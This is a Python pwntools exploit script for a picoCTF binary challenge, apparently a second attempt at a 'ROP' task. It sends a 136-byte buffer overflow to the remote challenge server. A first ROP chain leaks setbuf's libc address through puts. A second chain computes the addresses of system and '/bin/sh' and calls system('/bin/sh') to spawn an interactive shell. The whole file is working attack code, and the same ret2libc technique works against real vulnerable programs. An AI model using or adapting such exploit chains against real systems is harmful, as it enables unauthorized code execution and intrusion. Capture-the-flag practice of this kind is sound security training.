#!/usr/bin/env python3

from pwn import *

### - THIS IS A SECOND ATTEMPT AT ROP-V1 NOW USING SETBUF() - ###
### - FOR COMMENTS AND BREAKDOWN SEE V1 - ###

# This process is for the remote connection
p = remote("mercury.picoctf.net", 62289)

# This process is for local testing
# p = process('./vuln_patched')
# gdb.attach(p)

offset = 136
overflow_data = b"A" * offset

pop_rdi = 0x400913
setbuf_at_got = 0x601028
puts_plt = 0x400540
back_to_main = 0x400771

# Build ROP Chain 1
payload = [
    overflow_data,
    p64(pop_rdi),
    p64(setbuf_at_got),
    p64(puts_plt),
    p64(back_to_main)
]

payload = b''.join(payload)
p.sendline(payload)
p.recvline()
p.recvline()

leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"{hex(leak)=}")

### - ADDRESS MATH - ###
setbuf_offset = 0x88540
base_address_of_libc = leak - setbuf_offset
log.info(f"{hex(base_address_of_libc)=}")

system_offset = 0x4f4e0
system_address = base_address_of_libc + system_offset

# OLD OFFSET THAT WE FOUND WAS THE PROBLEM THROUGH DEBUGGING
# bin_sh_offset = 0x2b40fa
bin_sh_offset = 0x1b40fa
bin_sh_address = base_address_of_libc + bin_sh_offset

# Need ret instruction for stack alignment issue
ret_instruction = 0x40052e

# Build ROP Chain 2
second_payload = [
    overflow_data,
    p64(pop_rdi),
    p64(bin_sh_address),
    p64(ret_instruction),
    p64(system_address),
]

payload2 = b''.join(second_payload)
p.sendline(payload2)

p.interactive()